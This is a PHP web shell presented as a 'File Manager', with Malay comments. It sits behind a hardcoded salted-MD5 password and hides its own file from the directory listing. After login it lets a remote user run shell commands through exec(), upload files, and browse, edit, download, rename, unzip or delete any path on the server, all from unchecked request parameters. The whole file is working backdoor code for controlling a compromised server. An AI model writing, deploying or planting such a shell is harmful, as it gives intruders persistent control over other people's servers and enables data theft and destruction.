<?php

session_start();



// Dapatkan nama fail

$test = basename($_SERVER['PHP_SELF']);



function _uwux($password){

    $salt = "hackerz";

    $hashed = md5(substr($password,0,7).$salt.substr($password,7));

    return $hashed;

}



// Pemeriksaan log masuk

function _uwu($password){

    $y = "f3ec1864e2820c0c4161149d914d21b6";

    if ($password == $y){

        return true;

    }else{

        return false;

    }

}



if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cred'])) {

    $bar = _uwux($_POST['cred']);

    if (_uwu($bar)) {

        $_SESSION['auth'] = true; // Tetapkan pengguna sebagai log masuk

    } else {

        echo "<p style='color: red;'>Kata laluan salah!</p>";

    }

}

// Logout logik

if (isset($_GET['logout'])) {

    session_unset();

    session_destroy();

    header("Location: " . $_SERVER['PHP_SELF']);

    exit();

}



// Periksa sama ada pengguna log masuk

$loggedIn = isset($_SESSION['auth']) && $_SESSION['auth'];





function showDirectory($path) {

    $files = scandir($path);

    $dirs = [];

    $non_dirs = [];



    foreach ($files as $file) {

        if ($file != "." && $file != ".." && $file != basename(__FILE__)) {

            if (is_dir($path . "/" . $file)) {

                $dirs[] = $file;

            } else {

                $non_dirs[] = $file;

            }

        }

    }



    echo "<table border='1'>";

    echo "<tr><th>Name</th><th>Action</th></tr>";



    foreach ($dirs as $dir) {

        echo "<tr>";

        echo "<td><a href='$test?path=$path/$dir'>$dir/</a></td>";

        echo "<td><a href='?delete_dir=$path/$dir'>Delete</a> | <a href='?rename=$path/$dir'>Rename</a></td>";

        echo "</tr>";

    }



    foreach ($non_dirs as $file) {

        echo "<tr>";

        echo "<td>$file</td>";

        echo "<td><a href='?download_file=$path/$file'>Download</a> | <a href='?delete_file=$path/$file'>Delete</a> | <a href='?edit_file=$path/$file'>Edit</a> | <a href='?rename=$path/$file'>Rename</a>";

        if (pathinfo($file, PATHINFO_EXTENSION) == 'zip') {

            echo " | <a href='?unzip=$path/$file'>Unzip</a>";

        }

        echo "</td>";

        echo "</tr>";

    }



    echo "</table>";

}



function deleteDirectory($dir) {

    if (!is_dir($dir)) return;

    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {

        (is_dir("$dir/$file")) ? deleteDirectory("$dir/$file") : unlink("$dir/$file");

    }

    rmdir($dir);

}



function unzipFile($file) {

    $zip = new ZipArchive;

    if ($zip->open($file) === TRUE) {

        $zip->extractTo(dirname($file));

        $zip->close();

    } else {

        echo "Failed to unzip $file";

    }

}



$path = isset($_GET['path']) ? $_GET['path'] : '.';

if (isset($_POST['new_dir'])) {

    mkdir($path . "/" . $_POST['new_dir']);

}

if (isset($_FILES['fileToUpload'])) {

    $target_file = $path . "/" . basename($_FILES["fileToUpload"]["name"]);

    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);

}

if (isset($_GET['download_file'])) {

    $file = $_GET['download_file'];

    if (file_exists($file)) {

        header('Content-Description: File Transfer');

        header('Content-Type: application/octet-stream');

        header('Content-Disposition: attachment; filename="' . basename($file) . '"');

        header('Expires: 0');

        header('Cache-Control: must-revalidate');

        header('Pragma: public');

        header('Content-Length: ' . filesize($file));

        flush(); // Flush system output buffer

        readfile($file);

        exit;

    }

}

if (isset($_GET['delete_file'])) {

    unlink($_GET['delete_file']);

}

if (isset($_GET['delete_dir'])) {

    deleteDirectory($_GET['delete_dir']);

}

if (isset($_GET['unzip'])) {

    unzipFile($_GET['unzip']);

}

if (isset($_POST['file_content'])) {

    file_put_contents($_POST['file_path'], $_POST['file_content']);

    header("Location: $test?path=" . dirname($_POST['file_path']));

    exit();

}

if (isset($_POST['new_name'])) {

    $old_name = $_POST['old_name'];

    $new_name = $_POST['new_name'];

    rename($old_name, $new_name);

    header("Location: $test?path=" . dirname($old_name));

    exit();

}



if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {

    $command = escapeshellcmd($_POST['command']);

    $output = exec($command);

}



?>





<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>File Manager</title>

    <style>

        *{color:white;}

        input{background:white;color:black;}

        body { font-family: Arial, sans-serif; background-color:black;

        }

        .file-list { margin-top: 20px; }

        .file { margin: 5px 0; }

        table { width: 100%; border-collapse: collapse; }

        table, th, td { border: 1px solid black; }

        th, td { padding: 8px; text-align: left; }

        th, button { background-color: #f2f2f2; color:black;}

    </style>

</head>

<body>

<img src="https://i.ibb.co/WWCGtQR/Picsart-24-08-23-22-39-10-487.png" alt="logo" width="200px" style="display:block;margin:5px auto;">

<?php if(!$loggedIn):?>

<center>

<form action="" method="post">

        <input type="text" name="cred" required/>

        <input type="submit" value="login">

</form></center>

<?php endif;?>

<?php if ($loggedIn):?>

<h1 style="text-align:center;">File Manager</h1>

<button onclick="window.location.href = '<?=$test;?>?logout'">logout</button>

    <p>Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>

    <p>Your IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></p>

    <h2>Current Path: 

        <?php

        $paths = explode('/', realpath($path));

        $link = '';

        foreach ($paths as $dir) {

            $link .= $dir . '/';

            echo " / <a href='$test?path=" . urlencode($link) . "'>$dir</a>";

        }

        ?>

    </h2>

    

    <a href="?path=../<?php echo dirname($path); ?>">Back to Parent Directory</a>

    <br><br>



    <table>

        <tr>

            <td>

                <form action="" method="post">

                    <label for="new_dir">Create New Directory:</label>

            </td>

            <td>

                    <input type="text" name="new_dir" id="new_dir">

                    <input type="submit" value="Create">

                </form>

            </td>

        </tr>

        <tr>

            <td>

                <form action="" method="post" enctype="multipart/form-data">

                    <label for="fileToUpload">Upload File:</label>

            </td>

            <td>

                    <input type="file" name="fileToUpload" id="fileToUpload">

                    <input type="submit" value="Upload">

                </form>

            </td>

        </tr>

    </table>



    <br>

    <form action="" method="post">

        <label for="command">Run Command:</label>

        <input type="text" name="command" id="command">

        <input type="submit" value="Run">

    </form>



    <pre><?php if (isset($output)) echo $output; ?></pre>



    <div class="file-list">

        <?php showDirectory($path); ?>

    </div>

    <?php if (isset($_GET['edit_file'])): ?>

        <?php $file_content = file_get_contents($_GET['edit_file']); ?>

        <h2>Edit File: <?php echo $_GET['edit_file']; ?></h2>

        <form action="" method="post">

            <textarea style="background-color:black;color:white;" name="file_content" rows="20" cols="80"><?php echo htmlspecialchars($file_content); ?></textarea><br>

            <input type="hidden" name="file_path" value="<?php echo $_GET['edit_file']; ?>">

            <input style="font-size:2rem;" type="submit" value="Save">

        </form>

    <?php endif; ?>

    <?php if (isset($_GET['rename'])): ?>

        <h2>Rename File or Directory: <?php echo $_GET['rename']; ?></h2>

        <form action="" method="post">

            <label for="new_name">New Name:</label>

            <input type="text" name="new_name" id="new_name">

            <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">

            <input type="submit" value="Rename">

        </form>

    <?php endif; ?>

</body>

</html>

<?php endif;?>

